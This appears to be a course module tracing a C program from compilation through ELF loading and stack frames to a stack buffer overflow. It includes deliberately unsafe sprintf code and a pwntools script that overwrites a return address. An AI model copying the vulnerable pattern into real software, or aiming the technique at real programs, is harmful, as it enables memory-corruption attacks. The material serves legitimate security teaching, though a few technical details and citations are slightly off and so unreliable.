# End-to-End Workflow: From Source Code to Exploitation

This module connects everything covered in Phase 1. You will see how C code becomes a binary, how that binary is loaded into memory, how the CPU executes it, and exactly where vulnerabilities emerge in that chain.

---

## The Full Picture

```
You write C code
      |
      | gcc (compiler)
      v
ELF binary (file on disk)
      |
      | execve() — OS loader
      v
Process in virtual memory
      |
      | CPU fetch-decode-execute cycle
      v
Instructions running in RAM
      |
      | bug in code (e.g., gets())
      v
Memory corruption
      |
      | attacker controls input
      v
Return address overwritten
      |
      | RET instruction
      v
Attacker's code executes
```

Every step in that chain matters. Missing any one of them means you cannot understand or build exploits.

---

## Stage 1: Writing C Code

You write a program. It has functions, local variables, global variables, and calls to library functions.

```c
// program.c
#include <stdio.h>

char greeting[] = "Hello!";   // global variable -> .data

void say_hello(char *name) {
    char buf[32];              // local variable -> stack
    sprintf(buf, "%s, %s", greeting, name);
    puts(buf);
}

int main() {
    char *input = malloc(64); // dynamic allocation -> heap
    fgets(input, 64, stdin);
    say_hello(input);
    free(input);
    return 0;
}
```

At this point, your program is just text. Nothing is "in memory" yet.

---

## Stage 2: Compilation — Source to Binary

`gcc` transforms your C source into machine code through several steps:

```
program.c
    |
    | 1. Preprocessor (cpp)
    |    - expands #include, #define
    v
program.i  (expanded C source)
    |
    | 2. Compiler (cc1)
    |    - translates C to assembly
    v
program.s  (x86-64 assembly)
    |
    | 3. Assembler (as)
    |    - translates assembly to machine code bytes
    v
program.o  (object file — ELF, not yet executable)
    |
    | 4. Linker (ld)
    |    - combines object files
    |    - resolves references to libc (printf, malloc, etc.)
    |    - builds final ELF with all sections
    v
program    (ELF executable — ready to run)
```

```bash
# Watch each step:
gcc -E program.c -o program.i      # preprocessor only
gcc -S program.c -o program.s      # compile to assembly
gcc -c program.c -o program.o      # assemble to object file
gcc program.o -o program           # link into executable

# Or all at once:
gcc program.c -o program
```

### What the Linker Produces

The linker organizes everything into sections inside the ELF file:

```
ELF file (program):
+--------------------------+
|  ELF header              |  architecture, entry point address
+--------------------------+
|  .text                   |  machine code for say_hello(), main()
+--------------------------+
|  .rodata                 |  "%s, %s" format string (read-only)
+--------------------------+
|  .data                   |  greeting[] = "Hello!" (initialized)
+--------------------------+
|  .bss                    |  any uninitialized globals (zero at runtime)
+--------------------------+
|  .plt                    |  stubs: call to puts, fgets, malloc, etc.
|  .got                    |  table to be filled with libc addresses
+--------------------------+
```

```bash
# Inspect the sections yourself:
readelf -S program
objdump -d -M intel program   # disassemble .text
strings program               # see .rodata and .data contents
```

---

## Stage 3: Loading — Binary to Process

When you run `./program`, the shell calls `execve("./program", ...)`. The OS kernel takes over:

```
execve() system call
    |
    v
Kernel reads ELF header
    -> finds entry point address
    -> finds list of segments (LOAD segments)
    |
    v
Kernel creates a new process
    -> new virtual address space (clean slate)
    |
    v
Kernel maps ELF segments into virtual memory:
    .text   -> mapped as r-x  (read + execute)
    .data   -> mapped as rw-  (read + write)
    .bss    -> mapped as rw-, zeroed
    |
    v
Dynamic linker (ld-linux.so) is invoked
    -> reads .dynamic section
    -> finds required shared libraries: libc.so.6
    -> maps libc into the process's address space
    -> resolves PLT/GOT entries: fills in real addresses of puts, fgets, etc.
    |
    v
Kernel sets up the initial stack:
    -> pushes argc, argv[], envp[] onto the stack
    -> sets RSP to point to the top of this
    |
    v
Kernel transfers control to _start (C runtime entry)
    -> _start calls __libc_start_main()
    -> which calls main()
```

### What virtual memory looks like after loading

```
Virtual Address Space of ./program (after load):

0xFFFFFFFFFFFFFFFF
+================================+
|        Kernel Space            |  not accessible
+================================+

+--------------------------------+  randomized (ASLR)
|           Stack                |
|  [envp][argv][argc]            |  <- RSP starts here
|     |                          |
|     v  (grows downward)        |
+--------------------------------+

+--------------------------------+  randomized (ASLR)
|       libc.so.6                |  puts, fgets, malloc, free live here
|       (and other .so files)    |
+--------------------------------+

+--------------------------------+  randomized (ASLR)
|           Heap                 |  malloc() will give memory from here
|     ^  (grows upward)          |
+--------------------------------+

+--------------------------------+  0x400000 (no PIE) or randomized (PIE)
|       .bss                     |  uninitialized globals, zeroed
|       .data                    |  greeting[] = "Hello!"
|       .text                    |  machine code of your functions
|       .rodata                  |  "%s, %s"
+--------------------------------+

0x0000000000000000  (NULL — unmapped)
```

```bash
# See this live: add sleep(60) to your program, run it, then:
cat /proc/$(pgrep program)/maps
```

---

## Stage 4: Execution — CPU Running Instructions

The CPU starts at `_start`, which calls `main()`. Now the fetch-decode-execute cycle begins.

### main() is called — stack frame is created

```
CALL main:
  1. Push return address (RIP of instruction after CALL) onto stack
  2. Jump to main's first instruction

main's prologue:
  push rbp          ; save caller's base pointer
  mov  rbp, rsp     ; set our base pointer
  sub  rsp, 0x10    ; allocate space for local variables
```

Stack after entering main():

```
HIGH
+---------------------------+
|  _start's return address  |  (return from main goes back to _start)
+---------------------------+
|  saved RBP (_start's)     |  <- RBP now points here
+---------------------------+
|  char *input (8 bytes)    |  <- [rbp - 0x8]
+---------------------------+  <- RSP
LOW
```

### malloc(64) — heap is used

```
call malloc with rdi=64
    -> libc finds 64 free bytes on the heap
    -> returns pointer in RAX

mov [rbp-0x8], rax     ; store pointer in local var 'input'
```

Heap after malloc:

```
Heap:
+----------------------+
|  chunk header (16B)  |  size, flags — managed by malloc internally
+----------------------+
|  64 bytes of data    |  <- input points here
+----------------------+
|  top chunk           |  (available heap space)
+----------------------+
```

### fgets(input, 64, stdin) — input arrives

```
call fgets with:
  rdi = input pointer  (destination buffer)
  rsi = 64             (max bytes to read)
  rdx = stdin          (file descriptor 0)

-> kernel reads bytes from terminal into input buffer
-> stops at newline or 64 bytes
```

### say_hello(input) is called — new stack frame

```
CALL say_hello:
  push return address (RIP after the call in main)
  jump to say_hello

say_hello's prologue:
  push rbp
  mov  rbp, rsp
  sub  rsp, 0x20        ; allocate 32 bytes for char buf[32]
```

Stack now:

```
HIGH
+---------------------------+
|  _start's return address  |
+---------------------------+
|  saved RBP (_start's)     |
+---------------------------+  <- main()'s RBP
|  char *input              |
+---------------------------+
|  main's return address    |  <- after say_hello returns, go back here
+---------------------------+
|  saved RBP (main's)       |  <- say_hello's RBP
+---------------------------+
|  char buf[32]             |  <- [rbp - 0x20]
+---------------------------+  <- RSP
LOW
```

### sprintf writes into buf — here is the bug

```c
sprintf(buf, "%s, %s", greeting, name);
```

`sprintf` writes into `buf[32]`. If `name` (which came from `input`) is long enough, the formatted string exceeds 32 bytes and overflows into the stack above buf.

```
Overflow scenario: name = "A" * 60

sprintf writes:
  "Hello!, " (8 bytes) + "A" * 60 = 68 bytes total

Into buf[32]:
  buf[0..31]   = "Hello!, AAAAAAA..."   (fills buf)
  buf[32..39]  = "AAAAAAAA"             (overwrites saved RBP!)
  buf[40..47]  = "AAAAAAAA"             (overwrites return address!)
```

```
Stack after overflow:
+---------------------------+
|  main's return address    |  0x4141414141414141 <- CORRUPTED
+---------------------------+
|  saved RBP (main's)       |  0x4141414141414141 <- CORRUPTED
+---------------------------+
|  char buf[32]             |  "Hello!, AAAA..."
+---------------------------+
```

### RET — the CPU follows the corrupted address

```
say_hello's epilogue:
  leave          ; restore RSP and RBP
  ret            ; pop [RSP] into RIP -> RIP = 0x4141414141414141

CPU tries to fetch instruction at 0x4141414141414141
-> that address is not mapped
-> page fault
-> kernel sends SIGSEGV to process
-> "Segmentation fault"
```

If the attacker replaces `0x4141414141414141` with a real useful address (a `win()` function, a gadget, `system()`), code execution is redirected.

---

## Stage 5: Exploitation — Attacker Controls Execution

The attacker now crafts input knowing:
1. The buffer starts at `[rbp - 0x20]` (32 bytes)
2. The saved RBP is at `[rbp]` (8 bytes)
3. The return address is at `[rbp + 0x8]`
4. Offset = 32 + 8 = **40 bytes** to reach the return address

```python
from pwn import *

p = process('./program')
elf = ELF('./program')

offset   = 40
win_addr = elf.symbols['win']   # address of a function we want to call

payload  = b'A' * offset        # fill buffer + saved RBP
payload += p64(win_addr)        # overwrite return address

p.sendline(payload)
p.interactive()
```

When `say_hello()` executes `RET`:
- RSP points to the return address slot
- That slot now contains `win_addr`
- `RET` pops it into RIP → CPU jumps to `win()`

---

## Connecting Every Concept

| Concept | Where it appears in the workflow |
|---|---|
| **Bits and bytes** | Every value in memory, every address |
| **C programming** | Stage 1 — where the bug is written |
| **Compilation** | Stage 2 — C becomes machine code + ELF sections |
| **ELF format** | Stage 2/3 — how the binary is structured on disk |
| **Virtual memory** | Stage 3 — how the OS maps the binary into RAM |
| **Stack frames** | Stage 4 — created on every function call |
| **Heap** | Stage 4 — where malloc'd memory lives |
| **Calling convention** | Stage 4 — how arguments and return addresses are passed |
| **Assembly / RIP** | Stage 4/5 — CPU follows RIP, `RET` pops the return address |
| **Buffer overflow** | Stage 4 — unsafe write corrupts the stack |
| **Exploit / ROP** | Stage 5 — attacker redirects RIP to their target |
| **Mitigations** | Inserted at Stage 2 (canary, NX) and Stage 3 (ASLR, PIE) |

---

## The Key Insight

> A program is just data in memory. The CPU does not distinguish between "code" and "data" — it simply executes whatever RIP points to. If an attacker can write to memory and redirect RIP, they control the CPU.

This is the Von Neumann architecture's fundamental trade-off: storing code and data in the same memory makes computers programmable and general-purpose — and exploitable.

Every technique in this course is a variation of:

```
1. Find a way to write to memory you shouldn't control
2. Use that write to redirect RIP (directly or via ROP)
3. Point RIP at something useful (shell, privilege escalation)
```

---

## Quick Recap: What Happens When You Run ./program

```
1. Shell calls execve("./program")
2. Kernel reads ELF, creates process, maps segments into virtual memory
3. Dynamic linker maps libc, fills in GOT entries
4. Kernel builds stack with argc/argv, sets RSP, jumps to _start
5. _start calls main()
6. main() allocates stack frame, calls malloc() for heap memory
7. fgets() reads user input into heap buffer
8. say_hello() is called: new stack frame, buf[32] on stack
9. sprintf() writes into buf — if input too long, overflows
10. Saved RBP and return address are corrupted
11. say_hello() executes RET: pops corrupted address into RIP
12. CPU jumps to attacker-controlled address
```

---

## Exercises

1. Compile `program.c` with `-g` (debug symbols). Run it in GDB. Step through each function call with `ni`. After each call, run `info frame` and draw the stack on paper.
2. After `malloc(64)`, find the heap address in GDB (`p input`). Then run `cat /proc/<pid>/maps` in another terminal. Confirm the address falls in the `[heap]` region.
3. Set a breakpoint at `say_hello`. Print `$rbp`. Then calculate where the return address is (`x/gx $rbp+8`). Write down that address. Then step through the function and confirm `RET` jumps back there.
4. Introduce the overflow: change `fgets(input, 64, stdin)` to `gets(input)`. Find the offset to the return address using a cyclic pattern. Write an exploit that redirects to a `win()` function you add to the program.
5. Add `checksec --file=./program` to your workflow. Enable mitigations one at a time (`-fstack-protector`, then `-pie`) and observe how each changes the exploit.

---

## References

| Topic | Source |
|---|---|
| Full C-to-exploitation pipeline (the definitive walkthrough) | *Hacking: The Art of Exploitation* — Jon Erickson, Ch. 0x300 (Exploitation) |
| Compilation stages (preprocessor → assembler → linker) | `man gcc`; *Computer Architecture: A Quantitative Approach* — Patterson & Hennessy, Appendix B |
| ELF loading, dynamic linker, GOT/PLT resolution | *The Linux Programming Interface* — Michael Kerrisk, Ch. 41–42 (Shared Libraries) |
| Stack frame construction, calling convention | *Computer Architecture: A Quantitative Approach* — Patterson & Hennessy, Appendix B (Instruction Set Principles) |
| pwntools exploit scripting | [pwntools documentation](https://docs.pwntools.com) |
| GDB usage for exploit development | [pwndbg documentation](https://pwndbg.re/pwndbg/) |
